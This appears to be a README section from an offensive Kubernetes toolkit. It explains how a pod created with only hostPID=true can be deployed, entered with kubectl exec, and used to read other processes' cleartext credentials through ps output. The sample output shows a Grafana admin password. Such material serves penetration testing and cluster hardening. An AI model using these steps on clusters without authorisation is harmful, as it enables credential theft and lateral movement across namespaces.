## hostPIDonly pod - You can create a pod with only hostPID

If you only have `hostPID=true`, you most likely won't get RCE on the host, but you might find sensitive application secrets that belong to pods in other namespaces. This can be use to gain unauthorized access to applications and services in other namespaces or outside the cluster, and can potentially be used to further comprise the cluster. 

[pod-hostpid-only.yaml](pod-hostpid-only.yaml)

### Create a pod
```bash
# Option 1: Create pod from local yaml 
kubectl apply -f pod-hostpid-only.yaml  [-n namespace] 
# Option 2: Create pod from github hosted yaml
kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/yaml/pod-hostpid-only.yaml [-n namespace] 
```

### Exec into pod 
```bash 
kubectl -n [namespace] exec -it pod-hostpid-only -- bash
```
### Post exploitation
```bash
# View all processes running on the host and look for passwords, tokens, keys, etc. 
# Check out that clear text password in the ps output below! 

ps -aux
...omitted for brevity...
root     2123072  0.0  0.0   3732  2868 ?        Ss   21:00   0:00 /bin/bash -c while true; do ./my-program --grafana-uername=admin --grafana-password=admin; sleep 10;done
...omitted for brevity...

# Also, you can also kill any process, but don't do that in production :)
```

